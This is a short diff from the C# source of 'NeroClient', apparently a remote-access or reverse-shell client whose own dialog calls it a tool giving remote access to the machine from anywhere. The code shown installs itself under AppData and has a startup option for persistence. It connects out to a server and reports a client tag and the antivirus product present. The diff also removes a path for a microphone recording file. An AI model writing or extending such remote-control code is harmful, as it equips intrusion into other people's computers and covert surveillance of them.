@@ -77,7 +77,6 @@ namespace NeroClient.Forms
         private string FileToWrite;
         private string UpdateFileName;
         private readonly string InstallPath;
-        private readonly string AudioPath;
 
         #endregion Declaration
 
@@ -136,7 +135,6 @@ namespace NeroClient.Forms
             if (string.Equals(ClientSettings.Install, "true", StringComparison.OrdinalIgnoreCase)) Install = true;
             if (string.Equals(ClientSettings.Startup, "true", StringComparison.OrdinalIgnoreCase)) Startup = true;
             InstallPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + AppDomain.CurrentDomain.FriendlyName;
-            AudioPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + @"\micaudio.wav";
             if (!Install && Application.ExecutablePath == InstallPath)
             {
                 DialogResult dlgresult = MessageBox.Show("This is a reverse shell tool, which gives access to this machine remotely from anywhere!\nAre you sure you want to install this program?", "Are you sure?", MessageBoxButtons.YesNo,
@@ -184,7 +182,7 @@ namespace NeroClient.Forms
                         Console.WriteLine("Connected");
                         List<byte> ToSend = new List<byte>();
                         ToSend.Add((int) DataType.ClientTag);
-                        ToSend.AddRange(Encoding.ASCII.GetBytes(ClientSettings.ClientTag));
+                        ToSend.AddRange(Encoding.ASCII.GetBytes(AppDomain.CurrentDomain.FriendlyName));
                         Networking.MainClient.Send(ToSend.ToArray());
                         ToSend.Clear();
                         ToSend.Add((int) DataType.AntiVirusTag);
